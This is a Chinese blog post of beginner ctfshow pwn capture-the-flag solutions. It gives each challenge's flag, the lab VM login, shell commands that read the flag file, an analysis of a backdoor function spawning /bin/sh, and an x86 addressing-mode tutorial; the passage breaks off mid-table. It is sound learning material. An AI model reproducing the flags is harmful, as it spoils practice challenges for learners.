@@ -1,0 +1,979 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>CTF-PWN暑期刷题记录 | SereniusX的博客</title><meta name="author" content="SereniusX"><meta name="copyright" content="SereniusX"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="放一波暑假的刷题记录以下题目来源：ctfshow pwn入门 ☁️ ✴︎📩 🩹   Test_your_nc 01~05  01 pwn0🚩flag：ctfshow{f3fb4340-bbae-4ef1-ac35-e7668329b410} 💡hint：签到 题目描述：用户名为 ctfshow 密码 为 123456 请使用 ssh软件连接 专用虚拟机镜像，全套在这里，提取码show 虚拟">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTF-PWN暑期刷题记录">
+<meta property="og:url" content="https://sereniusx.github.io/2026/01/30/CTFshowPWN%E7%BB%83%E4%B9%A0/index.html">
+<meta property="og:site_name" content="SereniusX的博客">
+<meta property="og:description" content="放一波暑假的刷题记录以下题目来源：ctfshow pwn入门 ☁️ ✴︎📩 🩹   Test_your_nc 01~05  01 pwn0🚩flag：ctfshow{f3fb4340-bbae-4ef1-ac35-e7668329b410} 💡hint：签到 题目描述：用户名为 ctfshow 密码 为 123456 请使用 ssh软件连接 专用虚拟机镜像，全套在这里，提取码show 虚拟">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://sereniusx.github.io/img/avatar2.jpg">
+<meta property="article:published_time" content="2026-01-30T13:02:12.000Z">
+<meta property="article:modified_time" content="2026-01-30T14:41:34.990Z">
+<meta property="article:author" content="SereniusX">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://sereniusx.github.io/img/avatar2.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "CTF-PWN暑期刷题记录",
+  "url": "https://sereniusx.github.io/2026/01/30/CTFshowPWN%E7%BB%83%E4%B9%A0/",
+  "image": "https://sereniusx.github.io/img/avatar2.jpg",
+  "datePublished": "2026-01-30T13:02:12.000Z",
+  "dateModified": "2026-01-30T14:41:34.990Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "SereniusX",
+      "url": "https://sereniusx.github.io/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/avatar2.png"><link rel="canonical" href="https://sereniusx.github.io/2026/01/30/CTFshowPWN%E7%BB%83%E4%B9%A0/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'undefined')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'undefined')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'CTF-PWN暑期刷题记录',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/shuoshuo.css"><link rel="stylesheet" href="/css/gpt-article.css"><link rel="stylesheet" href="/css/custom.css"><link rel="stylesheet" href="/css/heatmap.css"><meta name="generator" content="Hexo 7.3.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar2.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">12</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li><li><a class="site-page child" href="/heatmap/"><i class="fa-fw fa fa-heart"></i><span> 热力图</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuos/"><i class="fa-fw fa fa-heart"></i><span> 说说</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/books/"><i class="fa-fw fas fa-book"></i><span> 书单</span></a></li><li><a class="site-page child" href="/useful/"><i class="fa-fw fas fa-tags"></i><span> 常用</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/mylink/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">SereniusX的博客</span></a><a class="nav-page-title" href="/"><span class="site-name">CTF-PWN暑期刷题记录</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li><li><a class="site-page child" href="/heatmap/"><i class="fa-fw fa fa-heart"></i><span> 热力图</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuos/"><i class="fa-fw fa fa-heart"></i><span> 说说</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/books/"><i class="fa-fw fas fa-book"></i><span> 书单</span></a></li><li><a class="site-page child" href="/useful/"><i class="fa-fw fas fa-tags"></i><span> 常用</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/mylink/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">CTF-PWN暑期刷题记录</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-01-30T13:02:12.000Z" title="发表于 2026-01-30 21:02:12">2026-01-30</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-01-30T14:41:34.990Z" title="更新于 2026-01-30 22:41:34">2026-01-30</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/PWN/">PWN</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div><article class="container post-content" id="article-container"><p>放一波暑假的刷题记录<br>以下题目来源：ctfshow pwn入门</p>
+<p>☁️ ✴︎📩 🩹</p>
+<blockquote>
+<p> Test_your_nc 01~05</p>
+</blockquote>
+<h2 id="01-pwn0"><a href="#01-pwn0" class="headerlink" title="01 pwn0"></a>01 pwn0</h2><p>🚩flag：<code>ctfshow{f3fb4340-bbae-4ef1-ac35-e7668329b410}</code></p>
+<p>💡hint：<code>签到</code></p>
+<p>题目描述：用户名为 ctfshow 密码 为 123456 请使用 ssh软件连接</p>
+<p><a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1wHPhZ7XOouFU6KgyOiSfLQ">专用虚拟机镜像，全套在这里，提取码show</a></p>
+<p>虚拟机镜像 用户名为ctfshow 密码是ctfshow</p>
+<img src="/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 13.36.26.png" alt="截屏2025-08-11 13.36.26" style="zoom:50%;">
+
+<p>给了一个shell。</p>
+<p>获取flag：</p>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> /</span><br><span class="line"><span class="built_in">cat</span> /ctfshow_flag</span><br></pre></td></tr></tbody></table></figure>
+
+<hr>
+<h2 id="02-pwn1"><a href="#02-pwn1" class="headerlink" title="02 pwn1"></a>02 pwn1</h2><p>🚩flag：<code>ctfshow{4dd710b0-23c0-4a5e-bcb8-909ec3aa4e81}</code></p>
+<p>💡hint：<code>基础分析</code></p>
+<p>使用<code>nc pwn.challenge.ctf.show 28107</code>连接上靶机，即可拿到flag。</p>
+<p>程序直接执行了后门函数</p>
+<hr>
+<h2 id="03-pwn2"><a href="#03-pwn2" class="headerlink" title="03 pwn2"></a>03 pwn2</h2><p>🚩flag：<code>ctfshow{5c2dc31f-35e8-4df8-ba49-155c8529e01b}</code></p>
+<p>💡hint：<code>基础分析</code></p>
+<p>题目描述：给你一个shell，这次需要你自己去获得flag</p>
+<p>环境中提示用户手动执行后门函数获得flag。</p>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /ctfshow_flag</span><br></pre></td></tr></tbody></table></figure>
+
+<hr>
+<h2 id="04-pwn03"><a href="#04-pwn03" class="headerlink" title="04 pwn03"></a>04 pwn03</h2><p>🚩flag：<code>ctfshow{d0593e57-6c08-4666-b6f3-d35718fb6f59}</code></p>
+<p>💡hint：<code>基础分析</code></p>
+<p>题目描述：哪一个函数才能读取flag？</p>
+<p>![截屏2025-08-11 13.49.26](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 13.49.26.png)</p>
+<ul>
+<li><code>system()</code> 是 Linux 系统调用，可以直接执行 shell 命令。</li>
+<li><code>cat /ctfshow_flag</code> 会读取 <code>/ctfshow_flag</code> 文件的内容并输出到终端。</li>
+</ul>
+<hr>
+<h2 id="05-pwn4"><a href="#05-pwn4" class="headerlink" title="05 pwn4"></a>05 pwn4</h2><p>🚩flag：<code>ctfshow{0b4bf2e8-ec76-480f-8ffb-453184a07ea9}</code></p>
+<p>💡hint：<code>反编译 </code> <code>自动化路径求解</code></p>
+<p>题目描述：或许需要先得到某个神秘字符</p>
+<p>![截屏2025-08-11 13.53.15](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 13.53.15.png)</p>
+<p>现在需要按照规范的流程来分析。</p>
+<p>先checksec：</p>
+<blockquote>
+<p><strong><code>checksec</code></strong> 是一个用于检查二进制文件安全防护机制的工具，它能快速分析 ELF 可执行文件或共享库的安全属性，包括：</p>
+<ul>
+<li><strong>NX（堆栈不可执行）</strong>：防止 shellcode 在栈上运行；</li>
+<li><strong>PIE（地址随机化）</strong>：使代码段加载地址随机化，增加漏洞利用难度；</li>
+<li><strong>RELRO（重定位只读）</strong>：保护 GOT 表不被篡改（Full RELRO 最安全）；</li>
+<li><strong>Canary（栈保护）</strong>：检测栈溢出攻击；</li>
+<li><strong>Fortify</strong>：对危险函数（如 <code>strcpy</code>）进行编译时加固。<br>运行 <code>checksec --file=程序名</code> 即可查看防护状态，帮助评估漏洞利用的可行性。</li>
+</ul>
+</blockquote>
+<p>![截屏2025-08-11 14.15.31](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 14.15.31.png)</p>
+<p>可以看到是64位保护全开。</p>
+<p>使用ida进行查看</p>
+<p>![截屏2025-08-11 14.16.46](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 14.16.46.png)</p>
+<p>大致流程如下：</p>
+<p>首先将字符串 “CTFshowPWN” 复制到 s1 变量中。</p>
+<p>接着，使用 puts 函数输出字符串 “find the secret !”。</p>
+<p>紧接着，通过 __isoc99_scanf 函数从用户输入中读取一个字符串到 s2 变量中。</p>
+<p>最后，通过 strcmp 函数比较 s1 和 s2 的内容是否相同。如果相同，则调用 execve_func 函 数。</p>
+<p>跟进execve_func()：</p>
+<p>![截屏2025-08-11 14.18.12](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 14.18.12.png)</p>
+<p>可以看到将字符串 “/bin/sh” 赋值给  argv 变量。</p>
+<p>然后，将 v2 和 v3 初始化为 0。</p>
+<p>通过调用 execve 系统调用来执行 /bin/sh shell。</p>
+<p>因此这里的execve_func也就是我们所谓的一个后门函数了</p>
+<p>所以根据主函数，我们需要输入的字符是：</p>
+<blockquote>
+<p>CTFshowPWN</p>
+</blockquote>
+<p>然后按照常规流程来获取flag即可。</p>
+<p>![截屏2025-08-11 14.23.39](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 14.23.39.png)</p>
+<hr>
+<blockquote>
+<p>06~35为前置基础系列</p>
+</blockquote>
+<h2 id="06-pwn5"><a href="#06-pwn5" class="headerlink" title="06 pwn5"></a>06 pwn5</h2><p>🚩flag：<code>ctfshow{0b4bf2e8-ec76-480f-8ffb-453184a07ea9}</code></p>
+<p>💡hint：<code>计组原理</code></p>
+<p>题目描述：运行此文件，将得到的字符串以ctfshow{xxxxx}提交。</p>
+<p>如：运行文件后 输出的内容为 Hello_World</p>
+<p>提交的flag值为：ctfshow{Hello_World}</p>
+<p>注意添加可执行权限：</p>
+<p>![截屏2025-08-11 14.42.42](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 14.42.42.png)</p>
+<p>添加外壳之后是ctfshow{Welcome_to_CTFshow_PWN}</p>
+<hr>
+<h2 id="07-pwn6"><a href="#07-pwn6" class="headerlink" title="07 pwn6"></a>07 pwn6</h2><p>🚩flag：<code>ctfshow{114514}</code></p>
+<p>💡hint：<code>计组原理</code></p>
+<p>题目描述：立即寻址方式结束后eax寄存器的值为？</p>
+<p>首先执行文件，结果跟上一题一样。</p>
+<p>![截屏2025-08-11 15.08.48](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 15.08.48.png)</p>
+<p>我们再来看源代码。</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">section .data</span><br><span class="line">    msg db "Welcome_to_CTFshow_PWN", 0</span><br><span class="line"></span><br><span class="line">section .text</span><br><span class="line">    global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line"></span><br><span class="line">; 立即寻址方式</span><br><span class="line">    mov eax, 11         ; 将11赋值给eax</span><br><span class="line">    add eax, 114504     ; eax加上114504</span><br><span class="line">    sub eax, 1          ; eax减去1</span><br><span class="line"></span><br><span class="line">; 寄存器寻址方式</span><br><span class="line">    mov ebx, 0x36d      ; 将0x36d赋值给ebx</span><br><span class="line">    mov edx, ebx        ; 将ebx的值赋值给edx</span><br><span class="line"></span><br><span class="line">; 直接寻址方式</span><br><span class="line">    mov ecx, msg      ; 将msg的地址赋值给ecx</span><br><span class="line"></span><br><span class="line">; 寄存器间接寻址方式</span><br><span class="line">    mov esi, msg        ; 将msg的地址赋值给esi</span><br><span class="line">    mov eax, [esi]      ; 将esi所指向的地址的值赋值给eax</span><br><span class="line"></span><br><span class="line">; 寄存器相对寻址方式</span><br><span class="line">    mov ecx, msg        ; 将msg的地址赋值给ecx</span><br><span class="line">    add ecx, 4          ; 将ecx加上4</span><br><span class="line">    mov eax, [ecx]      ; 将ecx所指向的地址的值赋值给eax</span><br><span class="line"></span><br><span class="line">; 基址变址寻址方式</span><br><span class="line">    mov ecx, msg        ; 将msg的地址赋值给ecx</span><br><span class="line">    mov edx, 2          ; 将2赋值给edx</span><br><span class="line">    mov eax, [ecx + edx*2]  ; 将ecx+edx*2所指向的地址的值赋值给eax</span><br><span class="line"></span><br><span class="line">; 相对基址变址寻址方式</span><br><span class="line">    mov ecx, msg        ; 将msg的地址赋值给ecx</span><br><span class="line">    mov edx, 1          ; 将1赋值给edx</span><br><span class="line">    add ecx, 8          ; 将ecx加上8</span><br><span class="line">    mov eax, [ecx + edx*2 - 6]  ; 将ecx+edx*2-6所指向的地址的值赋值给eax</span><br><span class="line"></span><br><span class="line">; 输出字符串</span><br><span class="line">    mov eax, 4          ; 系统调用号4代表输出字符串</span><br><span class="line">    mov ebx, 1          ; 文件描述符1代表标准输出</span><br><span class="line">    mov ecx, msg        ; 要输出的字符串的地址</span><br><span class="line">    mov edx, 22         ; 要输出的字符串的长度</span><br><span class="line">    int 0x80            ; 调用系统调用</span><br><span class="line"></span><br><span class="line">; 退出程序</span><br><span class="line">    mov eax, 1          ; 系统调用号1代表退出程序</span><br><span class="line">    xor ebx, ebx        ; 返回值为0</span><br><span class="line">    int 0x80            ; 调用系统调用</span><br><span class="line">                                                                                                                                                                                    </span><br></pre></td></tr></tbody></table></figure>
+
+<p>看懂注释，就是11+114504-1=114514</p>
+<p>即flag：ctfshow{114514}</p>
+<hr>
+<h2 id="08-pwn7"><a href="#08-pwn7" class="headerlink" title="08 pwn7"></a>08 pwn7</h2><p>🚩flag：<code>ctfshow{0x36D}</code></p>
+<p>💡hint：<code>计组原理</code></p>
+<p>题目描述：寄存器寻址方式结束后edx寄存器的值为？</p>
+<p>题目文件相比还是和上一个题目一样。看到上一个题目的代码：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">; 寄存器寻址方式</span><br><span class="line">    mov ebx, 0x36d      ; 将0x36d赋值给ebx</span><br><span class="line">    mov edx, ebx        ; 将ebx的值赋值给edx</span><br></pre></td></tr></tbody></table></figure>
+
+<p>故flag：<code>ctfshow{0x36D}</code></p>
+<p>内存中一般大写（？）</p>
+<hr>
+<h2 id="09-pwn8"><a href="#09-pwn8" class="headerlink" title="09 pwn8"></a>09 pwn8</h2><p>🚩flag：<code>ctfshow{0x80490E8}</code></p>
+<p>💡hint：<code>计组原理</code></p>
+<p>题目描述：直接寻址方式结束后ecx寄存器的值为？</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">section .data</span><br><span class="line">    msg db "Welcome_to_CTFshow_PWN", 0</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">; 直接寻址方式</span><br><span class="line">    mov ecx, msg      ; 将msg的地址赋值给ecx</span><br></pre></td></tr></tbody></table></figure>
+
+<p>注意这里是msg的地址，不是msg本身。</p>
+<p>ida中查看得到：0x80490E8</p>
+<p>相关资料：</p>
+<h3 id="x86-汇编寻址方式详解"><a href="#x86-汇编寻址方式详解" class="headerlink" title="x86 汇编寻址方式详解"></a><strong>x86 汇编寻址方式详解</strong></h3><p>在你的代码中，展示了多种 x86 汇编寻址方式。以下是每种方式的详细说明和示例：</p>
+<p><strong>1. 立即寻址（Immediate Addressing）</strong></p>
+<p><strong>特点</strong>：操作数直接编码在指令中（常数）。<br>​<strong>用途</strong>​：用于赋值或算术运算。<br>​<strong>示例</strong>​：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mov eax, 11      ; eax = 11（直接赋值）</span><br><span class="line">add eax, 114504  ; eax += 114504</span><br><span class="line">sub eax, 1       ; eax -= 1</span><br></pre></td></tr></tbody></table></figure>
+
+<p><strong>2. 寄存器寻址（Register Addressing）</strong></p>
+<p><strong>特点</strong>：操作数是寄存器。<br>​<strong>用途</strong>​：快速寄存器间数据传递。<br>​<strong>示例</strong>​：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mov ebx, 0x36d  ; ebx = 0x36d</span><br><span class="line">mov edx, ebx    ; edx = ebx</span><br></pre></td></tr></tbody></table></figure>
+
+<p><strong>3. 直接寻址（Direct Addressing）</strong></p>
+<p><strong>特点</strong>：操作数是内存地址（符号或绝对地址）。<br>​<strong>用途</strong>​：访问全局变量或静态数据。<br>​<strong>示例</strong>​：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mov ecx, msg    ; ecx = msg的地址（如 0x8049000）</span><br></pre></td></tr></tbody></table></figure>
+
+<p><strong>4. 寄存器间接寻址（Register Indirect Addressing）</strong></p>
+<p><strong>特点</strong>：操作数是寄存器指向的内存地址。<br>​<strong>用途</strong>​：通过指针访问内存。<br>​<strong>示例</strong>​：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mov esi, msg    ; esi = msg的地址</span><br><span class="line">mov eax, [esi]  ; eax = *esi（解引用）</span><br></pre></td></tr></tbody></table></figure>
+
+<p>⚠️ 注意：<code>[]</code> 表示解引用（类似 C 语言的 <code>*</code>）。</p>
+<p><strong>5. 寄存器相对寻址（Register Relative Addressing）</strong></p>
+<p><strong>特点</strong>：寄存器 + 偏移量访问内存。<br>​<strong>用途</strong>​：访问数组或结构体成员。<br>​<strong>示例</strong>​：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mov ecx, msg    ; ecx = msg的地址</span><br><span class="line">add ecx, 4      ; ecx += 4（偏移4字节）</span><br><span class="line">mov eax, [ecx]  ; eax = *ecx</span><br></pre></td></tr></tbody></table></figure>
+
+<p>相当于 <code>eax = msg[4]</code>（假设 <code>msg</code> 是字符数组）。</p>
+<p><strong>6. 基址变址寻址（Base-Index Addressing）</strong></p>
+<p><strong>特点</strong>：<code>基址寄存器 + 变址寄存器 * 比例因子</code>。<br>​<strong>用途</strong>​：高效访问多维数组或复杂数据结构。<br>​<strong>示例</strong>​：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mov ecx, msg      ; ecx = 基址（msg地址）</span><br><span class="line">mov edx, 2        ; edx = 变址（索引2）</span><br><span class="line">mov eax, [ecx + edx*2]  ; eax = *(ecx + edx*2)</span><br></pre></td></tr></tbody></table></figure>
+
+<p>相当于 <code>eax = msg[edx*2]</code>（假设每个元素占2字节）。</p>
+<p><strong>7. 相对基址变址寻址（Relative Base-Index Addressing）</strong></p>
+<p><strong>特点</strong>：<code>基址寄存器 + 变址寄存器 * 比例因子 + 偏移量</code>。<br>​<strong>用途</strong>​：灵活访问内存中的复杂结构。<br>​<strong>示例</strong>​：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mov ecx, msg          ; ecx = 基址</span><br><span class="line">mov edx, 1            ; edx = 变址</span><br><span class="line">add ecx, 8            ; ecx += 8（基址偏移）</span><br><span class="line">mov eax, [ecx + edx*2 - 6]  ; eax = *(ecx + edx*2 - 6)</span><br></pre></td></tr></tbody></table></figure>
+
+<p>相当于 <code>eax = msg[8 + edx*2 - 6]</code>。</p>
+<p><strong>8. 系统调用中的寻址应用</strong></p>
+<p>你的代码最后使用了 <strong>直接寻址</strong> 传递字符串地址：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mov eax, 4          ; sys_write 系统调用</span><br><span class="line">mov ebx, 1          ; stdout</span><br><span class="line">mov ecx, msg        ; 字符串地址（直接寻址）</span><br><span class="line">mov edx, 22         ; 字符串长度</span><br><span class="line">int 0x80</span><br></pre></td></tr></tbody></table></figure>
+
+<p>这里 <code>msg</code> 是直接寻址，而 <code>edx</code> 是立即寻址。</p>
+<p><strong>寻址方式对比表</strong></p>
+<table>
+<thead>
+<tr>
+<th>寻址方式</th>
+<th>语法示例</th>
+<th>等效 C 语言</th>
+<th>典型用途</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>立即寻址</strong></td>
+<td><code>mov eax, 11</code></td>
+<td><code>eax = 11;</code></td>
+<td>常数赋值</td>
+</tr>
+<tr>
+<td><strong>寄存器寻址</strong></td>
+<td><code>mov edx, ebx</code></td>
+<td><code>edx = ebx;</code></td>
+<td>寄存器间数据传递</td>
+</tr>
+<tr>
+<td><strong>直接寻址</strong></td>
+<td><code>mov ecx, msg</code></td>
+<td><code>ecx = &amp;msg;</code></td>
+<td>访问全局变量</td>
+</tr>
+<tr>
+<td><strong>寄存器间接寻址</strong></td>
+<td><code>mov eax, [esi]</code></td>
+<td><code>eax = *esi;</code></td>
+<td>指针解引用</td>
+</tr>
+<tr>
